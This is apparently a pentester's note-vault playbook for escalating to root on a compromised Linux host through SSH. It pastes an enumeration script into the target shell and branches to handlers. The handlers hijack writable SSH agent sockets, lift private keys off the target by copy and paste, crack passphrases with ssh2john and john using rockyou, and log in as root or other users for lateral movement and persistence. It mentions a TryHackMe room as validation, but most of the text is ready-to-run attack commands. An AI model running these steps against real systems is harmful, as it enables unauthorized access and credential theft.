
**Pre-root** SSH key and agent enumeration. Read-only enum from foothold user's perspective.

---

## Step 1 — Paste and run `ssh_enum.sh`

On **attacker**:

`(echo "bash <<'EOF'"; sed -e '/^[[:space:]]*#/d' -e '/^[[:space:]]*$/d' ~/scripts/ssh_enum.sh; echo "EOF") | xclip -selection clipboard`

(Wayland: substitute `wl-copy` for `xclip -selection clipboard`.)

Paste into target shell.

Route on output in priority order below. Stop when root achieved. 

(`<fp>` = key fingerprint, `SHA256:...` or `no-fp` — informational).

- `SSH_AGENT_HIJACKABLE: <sock> (owner=<owner>)` → agent socket writable by foothold user. → **Agent hijack handler**.
- `SSH_PRIVKEY: <file> [plain] [<fp>]` → readable, unencrypted private key. → **Private key handler — plain**.
- `SSH_PEM_OUTLIER: <file> [plain] [<fp>]` → readable, unencrypted private key. → **Private key handler — plain**.
- `SSH_PRIVKEY: <file> [encrypted] [<fp>]` → readable, passphrase-protected private key. → **Private key handler — encrypted**.
- `SSH_PEM_OUTLIER: <file> [encrypted] [<fp>]` → readable, passphrase-protected private key. → **Private key handler — encrypted**.
- `SSH_CONFIG: <file>` → SSH client config present; indented non-comment lines follow. → **Config handler**.
- `SSH_AGENT_PRESENT: <sock>` or `SSH_AGENT_ENV: <sock>` → agent observable but not writable. Note socket path; revisit post-root.
- `SSH_AUTHKEYS: <file>` → indented authorized public keys follow. → **Public key handler — Debian PRNG lookup** (Step 2, stub — build deferred; see design note). Informational fallback — note which principals have trusted keys for this account.
- `SSH_PUBKEY: <file>` → standalone public key. → **Public key handler — Debian PRNG lookup** (Step 2, stub — build deferred; see design note). Informational fallback if handler unbuilt.
- `SSH_KNOWNHOSTS: <file>` → indented hostnames follow. Note as lateral pivot leads.
- `SSH_DIR_DENIED` / `SSH_PRIVKEY_DENIED` / `SSH_AUTHKEYS_DENIED` / `SSH_CONFIG_DENIED` / `SSH_KNOWNHOSTS_DENIED` / `SSH_FILE_DENIED` → exists, foothold user cannot read. Log `<file>` path for post-root extraction.

No `SSH_PRIVKEY`, `SSH_PEM_OUTLIER`, or `SSH_AGENT_HIJACKABLE` in output → targeted pass found **nothing** actionable. Accept noise cost and run wide pass (Step 1a, below), or return to [[Linux Privilege Escalation Checksheet]] `Credential Harvesting`.

---

##### Step 1a — Wide pass (explicit OPSEC decision required)

⚠️ Creates a long-running `find /` visible in `ps`; high `open`-syscall volume detectable by auditd and EDR.

On **attacker**:

`(echo "bash -s -- --wide <<'EOF'"; sed -e '/^[[:space:]]*#/d' -e '/^[[:space:]]*$/d' ~/scripts/ssh_enum.sh; echo "EOF") | xclip -selection clipboard`

(Wayland: substitute `wl-copy`.) 

Paste into target shell. Wait for `SSH_WIDE_PASS_DONE`, then route any `SSH_PEM_OUTLIER` markers through the handlers below.

No `SSH_PEM_OUTLIER` after wide pass → no keys found. Return to [[Linux Privilege Escalation Checksheet]] `Credential Harvesting`.

---

## Step 2 — Handlers

### Agent hijack handler

`SSH_AUTH_SOCK=<sock> ssh-add -l`

- Keys listed → proceed to SSH attempts below.
- `Could not open a connection to your authentication agent` → socket dead; skip.

`SSH_AUTH_SOCK=<sock> ssh root@localhost`

Try root on localhost first — the hijacked agent most commonly belongs to a privileged session. If no shell:

`SSH_AUTH_SOCK=<sock> ssh <user>@<target>`

Try `<owner>` from the marker, then other interactive users (`awk -F: '($3==0||$3>=1000)&&$7!~/(nologin|false)/{print $1}' /etc/passwd`). For `<target>`, try `localhost` then hosts from `SSH_KNOWNHOSTS` output.

- Shell returned → `id`. Root → Decision. Non-root → lateral foothold; re-enter [[Linux Privilege Escalation Checksheet]] from that context.
- `Permission denied` → agent's loaded keys not authorized for that user; try next.
- `Connection refused` → SSH not listening locally; try hosts from `SSH_KNOWNHOSTS`.

### Private key handler — plain

Identify target `<user>` from `<file>` path:

- `/etc/ssh/ssh_host_*_key` → server host-identity key, not user auth. **Skip.**
- `/root/.ssh/` or `/etc/ssh/` → try `root` first.
- `/home/<user>/.ssh/` → try `root` first, then `<user>`.
-  **OUTLIER** path → try `root` first, then all interactive users: `awk -F: '($3==0||$3>=1000)&&$7!~/(nologin|false)/{print $1}' /etc/passwd`

Try from **target** first; if foothold too limited for interactive SSH or `Connection refused` → from **attacker**.
##### From **target** (primary — no exfiltration; immune to client/server algorithm mismatch):

`ssh -i <file> <user>@<target>`

- Shell returned → `id`. Root → Decision. Non-root → lateral foothold; re-enter [[Linux Privilege Escalation Checksheet]] from that context.
- `Permission denied (publickey)` → key not authorized for `<user>`; try next `<user>`.
- `Too many authentication failures` → `ssh -o IdentitiesOnly=yes -i <file> <user>@localhost`
- `Connection refused` or SSH unavailable from target → fallback to from **attacker** below.
- All users exhausted → next key.

##### From **attacker** (fallback — foothold shell too limited for interactive SSH, or SSH not listening on localhost):

`cat <file>`

Copy displayed output (`-----BEGIN` through `-----END` inclusive). 

On **attacker**:

`cat > /tmp/key.pem << 'EOF'`

(Paste key, Enter, then on a new line type `EOF` and Enter.)

`chmod 600 /tmp/key.pem`

`ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -i /tmp/key.pem <user>@<target>`

- Shell returned → `id`. Root → Decision. Non-root → lateral foothold.
- `Permission denied (publickey)` → key not authorized for `<user>`; try next `<user>`.
- `Too many authentication failures` → `ssh -o IdentitiesOnly=yes -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -i /tmp/key.pem <user>@<target>`
- All users exhausted → next key.

### Private key handler — encrypted

On **target**:

`cat <file>`

Copy displayed output (`-----BEGIN` through `-----END` inclusive). 

On **attacker**:

`cat > /tmp/key.pem << 'EOF'`

(Paste key, then on a new line type `EOF` and Enter.)

`chmod 600 /tmp/key.pem`

`ssh2john /tmp/key.pem > /tmp/key.hash`

`john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/key.hash`

- Not cracked by rockyou → log `<file>` path and hash for later; next key.

John prints `<passphrase> (<label>)` if cracked.

Identify target `<user>` from `<file>` path:

- `/etc/ssh/ssh_host_*_key` → server host-identity key, not user auth. **Skip.**
- `/root/.ssh/` or `/etc/ssh/` → try `root` first.
- `/home/<user>/.ssh/` → try `root` first, then `<user>`.
- **OUTLIER** path → try `root` first, then all interactive users: `awk -F: '($3==0||$3>=1000)&&$7!~/(nologin|false)/{print $1}' /etc/passwd`

Try from **target** first; if foothold too limited for interactive SSH or `Connection refused` → from **attacker**.

##### From **target** (primary — key already at `<file>`; immune to client/server algorithm mismatch):

`ssh -i <file> <user>@<target>`

(Enter `<passphrase>` when prompted.)

- Shell returned → `id`. Root → Decision. Non-root → lateral foothold; re-enter [[Linux Privilege Escalation Checksheet]] from that context.
- `Permission denied (publickey)` → key not authorized for `<user>`; try next `<user>`.
- `Too many authentication failures` → `ssh -o IdentitiesOnly=yes -i <file> <user>@<target>`
- `Connection refused` or SSH unavailable from target → fallback below.
- All users exhausted → next key.

##### From **attacker** (fallback — foothold shell too limited for interactive SSH, or SSH not listening):

`ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -i /tmp/key.pem <user>@<target>`

(Enter `<passphrase>` when prompted.)

- Shell returned → `id`. Root → Decision. Non-root → lateral foothold.
- `Permission denied (publickey)` → key not authorized for `<user>`; try next `<user>`.
- `Too many authentication failures` → `ssh -o IdentitiesOnly=yes -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -i /tmp/key.pem <user>@<target>`
- All users exhausted → next key.


---
### Public key handler — Debian PRNG lookup

⚠️ **Handler stub — build deferred.** When an `SSH_AUTHKEYS` pubkey or `SSH_PUBKEY` marker fires, consult [[SSH Keys Debian PRNG Public Key Handler]] design note in `Design Notes/` folder and build out the handler body per the specification there. Design note captures: CVE-2008-0166 mechanism from primary sources; the keys-don't-move-on-upgrade principle that governs why the check must be per-key not per-box; sshd_config-aware target-user derivation logic; fingerprint→blacklist→recover→SSH-in chain; required `~/scripts/ssh_enum.sh` extensions (wide pubkey pass + sshd_config `AuthorizedKeysFile` parsing); required [[Attacker Toolchain]] two-part setup (openssl-blacklist detection layer + precomputed private-key recovery layer).

---
### Config handler

Inspect indented lines following `SSH_CONFIG: <file>`. Extract:

- `HostName <host>` → pivot target host.
- `User <user>` → user to authenticate as on that host.
- `IdentityFile <path>` → cross-reference `<path>` against `SSH_PRIVKEY` / `SSH_PEM_OUTLIER` markers in Step 1 output. If `<path>` appears as a readable key → apply matching key handler to connect to `<host>` as `<user>`.

If `<path>` is in a `*_DENIED` marker → log for post-root extraction. No immediate action.

---

## Decision

Root shell achieved. Next steps are goal-dependent; common destinations:

- Credential extraction (additional users' hashes, SSH keys, app secrets) → [[Linux Credential Extraction Checksheet]]
- Persistence (SSH key, cron, systemd) → [[Linux Persistence Checksheet]]
- Lateral movement → [[Linux Lateral Movement Checksheet]]

---

## Validation

THM:Linux PrivEsc:Task 18 Passwords & Keys - SSH Keys